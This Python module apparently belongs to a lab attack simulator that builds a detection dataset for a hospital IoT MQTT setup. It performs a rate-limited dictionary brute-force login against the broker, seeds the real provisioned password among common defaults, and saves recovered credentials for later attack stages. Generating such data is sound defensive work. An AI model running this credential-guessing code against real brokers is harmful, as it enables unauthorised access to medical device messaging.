"""bruteforce: rate-limited dictionary attack against the lab broker. To guarantee the dataset
has a successful credential-access event, the wordlist seeds the real password (from the
provisioned creds file) at a random position among decoys. Recovered creds go to
stolen_creds.json for the abuse classes."""
import threading
import time

import paho.mqtt.client as mqtt

DECOYS = ["admin", "1234", "password", "mqtt", "test", "root", "nurse",
          "hospital", "changeme", "iot", "medical", "ward", "letmein", "default"]


def _try_login(broker_ip, user, password, timeout=5):
    c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, protocol=mqtt.MQTTv5)
    c.username_pw_set(user, password)
    res, ev = {}, threading.Event()
    c.on_connect = lambda cl, u, f, rc, p: (res.__setitem__("rc", rc), ev.set())
    try:
        c.connect(broker_ip, 1883)
        c.loop_start()
        ev.wait(timeout)
        c.loop_stop()
        c.disconnect()
    except Exception:
        return False
    rc = res.get("rc")
    return rc is not None and not rc.is_failure


def _wordlist(rng, real):
    wl = DECOYS[:]
    rng.shuffle(wl)
    if real:
        wl.insert(rng.randrange(len(wl) + 1), real)
    return wl


def bruteforce(ctx, params):
    users = params.get("users") or [ctx.nurse_user, ctx.rng.choice(ctx.monitor_users)]
    delay = float(params.get("delay", 0.3))
    recovered, tried = {}, 0
    for user in users:
        for pw in _wordlist(ctx.rng, ctx.provisioned(user)):
            tried += 1
            time.sleep(delay)          # rate-limit the guesses
            if _try_login(ctx.broker_ip, user, pw):
                recovered[user] = {"password": pw, "via": "bruteforce"}
                break
    if recovered:
        ctx.save_stolen(recovered)
    return {"targets": [ctx.broker_ip],
            "outcome": "success" if recovered else "fail",
            "notes": f"{tried} guesses at {delay}s spacing; recovered {sorted(recovered)}"}


bruteforce.STAGE = "credential-access"
